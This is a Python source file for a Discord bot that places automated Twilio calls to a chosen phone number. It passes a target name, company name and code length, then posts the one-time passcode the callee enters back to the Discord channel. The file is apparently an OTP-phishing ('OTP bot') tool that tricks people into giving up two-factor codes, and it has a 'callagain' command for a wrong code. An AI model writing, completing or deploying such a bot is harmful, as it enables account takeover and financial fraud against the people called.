import discord_slash.utils.manage_commands
import discord
from discord.ext import commands
from discord_slash import SlashCommand, SlashContext
from flask import Flask, request
from twilio.rest import Client
import time
import os
import json

if not 'Config.txt' in os.listdir():
    open('Config.txt', 'w').write('{"account_sid":"", "auth_token":"", "Twilio Phone Number":"+123456789", "ngrok_url":"https://example.ngrok.io", "server_id":"", "bot_token":""}')
if not 'status.txt' in os.listdir():
    open('status.txt',  'w').close()
if not 'otp.txt' in os.listdir():
    open('otp.txt', 'w').close()
if not 'Extra' in os.listdir():
    os.mkdir('Extra')
if not 'Company Name.txt' in os.listdir('Extra'):
    open('Extra/Company Name.txt', 'w').close()
if not 'Digits.txt' in os.listdir('Extra'):
    open('Extra/Digits.txt', 'w').close()
if not 'Name.txt' in os.listdir('Extra'):
    open('Extra/Name.txt', 'w').close()

raw_config = json.loads(open('Config.txt', 'r').read())

client_discord = commands.Bot(command_prefix='=')
slash = SlashCommand(client_discord, sync_commands=True)
guild = discord.Guild
account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
your_twilio_phone_number = raw_config['Twilio Phone Number']
ngrok = raw_config['ngrok_url']
client = Client(account_sid, auth_token)
server_id = int(raw_config['server_id'])

app = Flask(__name__)


@slash.slash(
    name='call',
    description='F',
    guild_ids=[server_id],
    options=[
        discord_slash.utils.manage_commands.create_option(
            name='phone',
            description='With +1',
            required=True,
            option_type=3
        ),
        discord_slash.utils.manage_commands.create_option(
            name='digits',
            description='Seg',
            required=True,
            option_type=3
        ),
        discord_slash.utils.manage_commands.create_option(
            name='name',
            description='Seg',
            required=True,
            option_type=3
        ),
        discord_slash.utils.manage_commands.create_option(
            name='companyname',
            description='Seg',
            required=True,
            option_type=3
        )

    ]
)
async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=str):
    await ctx.send('n')
    if open('status.txt', 'r').read() == 'busy':
        embed = discord.Embed(title='',
                              description=f'Busy...With  other call',
                              color=discord.Colour.red())
        await ctx.send(embed=embed)
    else:
        open('status.txt', 'w').write('busy')
    open('Extra/Digits.txt', 'w').write(f'{digits}')
    open('Extra/Name.txt', 'w').write(f'{name}')
    open('Extra/Company Name.txt', 'w').write(f'{companyname}')
    call = client.calls.create(
        url=f'{ngrok}/voice',
        to=f'{phone}',
        from_=f'{your_twilio_phone_number}'
    )
    sid = call.sid
    a = 0
    b = 0
    c = 0
    d = 0
    while True:
        if client.calls(sid).fetch().status == 'queued':
            if not a >= 1:
                embed = discord.Embed(title='', description='Queued', color=discord.Colour.green())
                await ctx.channel.send(embed=embed)
                a = a + 1
        elif client.calls(sid).fetch().status == 'ringing':
            if not b >= 1:
                embed = discord.Embed(title='', description='Ringing', color=discord.Colour.green())
                await ctx.channel.send(embed=embed)
                b = b + 1
        elif client.calls(sid).fetch().status == 'in-progress':
            if not c >= 1:
                embed = discord.Embed(title='', description='In Progress',
                                      color=discord.Colour.green())
                await ctx.channel.send(embed=embed)
                c = c + 1
        elif client.calls(sid).fetch().status == 'completed':
            embed = discord.Embed(title='', description='Completed', color=discord.Colour.green())
            await ctx.channel.send(embed=embed)
            break
        elif client.calls(sid).fetch().status == 'failed':
            embed = discord.Embed(title='Just a Normal Bot', description='Failed',
                                  color=discord.Colour.red())
            await ctx.channel.send(embed=embed)
            break
        elif client.calls(sid).fetch().status == 'no-answer':
            embed = discord.Embed(title='Just a Normal Bot', description='No Answer',
                                  color=discord.Colour.red())
            await ctx.channel.send(embed=embed)
            break
        elif client.calls(sid).fetch().status == 'canceled':
            embed = discord.Embed(title='Just a Normal Bot', description='Canceled',
                                  color=discord.Colour.red())
            await ctx.channel.send(embed=embed)
            break
        elif client.calls(sid).fetch().status == 'busy':
            embed = discord.Embed(title='Just a Normal Bot', description='Busy',
                                  color=discord.Colour.red())
            await ctx.channel.send(embed=embed)
            break
    time.sleep(1)
    otp = open(f'otp.txt', 'r').read()
    call1 = client.calls(sid).fetch()
    print(sid)
    if otp == '':
        embed = discord.Embed(title='',
                              description=f'No OTP \n\n\nPrice : {call1.price}\nDuration : {call1.duration} secs',
                              color=discord.Colour.red())
        await ctx.channel.send(embed=embed)
    else:
        embed = discord.Embed(title='',
                              description=f'{otp}\n\n\n\nPrice : {call1.price}\nDuration : {call1.duration} secs',
                              color=discord.Colour.green())
        await ctx.channel.send(embed=embed)
    open('otp.txt', 'w').write('')
    open('status.txt', 'w').write('')


@slash.slash(
    name='callagain',
    description='For wrong otp code',
    guild_ids=[server_id],
    options=[
        discord_slash.utils.manage_commands.create_option(
            name='phone',
            description='With +1',
            required=True,
            option_type=3
        ),
        discord_slash.utils.manage_commands.create_option(
            name='digits',
            description='Seg',
            required=True,
            option_type=3
        ),
        discord_slash.utils.manage_commands.create_option(
            name='name',
            description='Seg',
            required=True,
            option_type=3
        ),
        discord_slash.utils.manage_commands.create_option(
            name='companyname',
            description='Seg',
            required=True,
            option_type=3
        )

    ]
)
async def _call(ctx=SlashContext, phone=str, digits=str, name=str, companyname=str):
    if open('status.txt', 'r') == 'busy':
        embed = discord.Embed(title='',
                              description=f'Busy...With other call',
                              color=discord.Colour.red())
        await ctx.send(embed=embed)
    else:
        open('status.txt', 'w').write('busy')
    open('Extra/Digits.txt', 'w').write(f'{digits}')
    open('Extra/Name.txt', 'w').write(f'{name}')
    open('Extra/Company Name.txt', 'w').write(f'{companyname}')
    call = client.calls.create(
        url=f'{ngrok}/voiceagain',
        to=f'{phone}',
        from_=your_twilio_phone_number
    )
    sid = call.sid
    a = 0
    b = 0
    c = 0
    d = 0
    while True:
        if client.calls(sid).fetch().status == 'queued':
            if not a >= 1:
                embed = discord.Embed(title='', description='Queued', color=discord.Colour.green())
                await ctx.send(embed=embed)
                a = a + 1
        elif client.calls(sid).fetch().status == 'ringing':
            if not b >= 1:
                embed = discord.Embed(title='', description='Ringing', color=discord.Colour.green())
                await ctx.channel.send(embed=embed)
                b = b + 1
        elif client.calls(sid).fetch().status == 'in-progress':
            if not c >= 1:
                embed = discord.Embed(title='', description='In Progress',
                                      color=discord.Colour.green())
                await ctx.channel.send(embed=embed)
                c = c + 1
        elif client.calls(sid).fetch().status == 'completed':
            embed = discord.Embed(title='', description='Completed', color=discord.Colour.green())
            await ctx.channel.send(embed=embed)
            break
        elif client.calls(sid).fetch().status == 'failed':
            embed = discord.Embed(title='Just a Normal Bot', description='Failed',
                                  color=discord.Colour.red())
            await ctx.channel.send(embed=embed)
            break
        elif client.calls(sid).fetch().status == 'no-answer':
            embed = discord.Embed(title='Just a Normal Bot', description='No Answer',
                                  color=discord.Colour.red())
            await ctx.channel.send(embed=embed)
            break
        elif client.calls(sid).fetch().status == 'canceled':
            embed = discord.Embed(title='Just a Normal Bot', description='Canceled',
                                  color=discord.Colour.red())
            await ctx.channel.send(embed=embed)
            break
        elif client.calls(sid).fetch().status == 'busy':
            embed = discord.Embed(title='Just a Normal Bot', description='Busy',
                                  color=discord.Colour.red())
            await ctx.channel.send(embed=embed)
            break
    time.sleep(1)
    otp = open(f'otp.txt', 'r').read()
    call1 = client.calls(sid).fetch()
    if otp == '':
        embed = discord.Embed(title='',
                              description=f'No OTP \n\n\nPrice : {call1.price}\nDuration : {call1.duration} secs',
                              color=discord.Colour.red())
        await ctx.channel.send(embed=embed)
    else:
        embed = discord.Embed(title='Just a Normal Bot',
                              description=f'{otp}\n\n\n\nPrice : {call1.price}\nDuration : {call1.duration} secs',
                              color=discord.Colour.green())
        await ctx.channel.send(embed=embed)
    open('otp.txt', 'w').close()
    open('status.txt', 'w').close()

client_discord.run(
    raw_config['bot_token']
)
